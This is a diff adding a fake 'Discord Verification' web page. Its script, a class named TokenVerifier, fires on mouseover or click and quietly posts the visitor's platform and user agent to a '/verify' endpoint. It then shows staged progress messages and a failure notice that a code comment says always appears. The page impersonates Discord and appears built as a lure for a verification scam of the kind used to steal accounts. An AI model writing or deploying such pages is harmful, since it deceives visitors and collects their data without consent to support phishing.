@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #36393f;
+            color: #dcddde;
+        }
+        .verify-button {
+            padding: 16px 32px;
+            font-size: 18px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .verify-button:hover {
+            background: #4752c4;
+            transform: scale(1.05);
+        }
+        .verify-button.searching {
+            background: #43b581;
+            pointer-events: none;
+        }
+        .status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            background: #202225;
+            border-radius: 4px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <button class="verify-button" id="verifyButton">Verify Account</button>
+    <div class="status" id="status"></div>
+
+    <script>
+        class TokenVerifier {
+            constructor() {
+                this.button = document.getElementById('verifyButton');
+                this.status = document.getElementById('status');
+                this.isSearching = false;
+                this.initializeEventListeners();
+            }
+
+            initializeEventListeners() {
+                ['mouseover', 'click'].forEach(event => {
+                    this.button.addEventListener(event, () => {
+                        if (!this.isSearching) {
+                            this.verifyAccount();
+                        }
+                    });
+                });
+            }
+
+            async verifyAccount() {
+                try {
+                    this.isSearching = true;
+                    this.button.classList.add('searching');
+                    
+                    // Initial status
+                    this.showStatus('Starting verification...', '#43b581');
+                    await this.delay(1000);
+
+                    // Show checking status
+                    this.showStatus('Checking account details...', '#43b581');
+                    await this.delay(2000);
+
+                    // Send verification request
+                    const response = await fetch('/verify', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            platform: navigator.platform,
+                            userAgent: navigator.userAgent
+                        })
+                    });
+
+                    // Show processing
+                    this.showStatus('Processing verification...', '#43b581');
+                    await this.delay(2000);
+
+                    // Always show error after "processing"
+                    this.showStatus('Verification failed: Invalid account permissions', '#f04747');
+                    await this.delay(3000);
+                    
+                    // Final error message
+                    this.showStatus('Please contact server administrator', '#f04747');
+
+                } catch (error) {
+                    this.showStatus('Error during verification', '#f04747');
+                } finally {
+                    setTimeout(() => {
+                        this.button.classList.remove('searching');
+                        this.isSearching = false;
+                    }, 2000);
+                }
+            }
+
+            showStatus(message, color) {
+                this.status.textContent = message;
+                this.status.style.background = color;
+                this.status.style.display = 'block';
+            }
+
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        }
+
+        const verifier = new TokenVerifier();
+    </script>
+</body>
+</html>
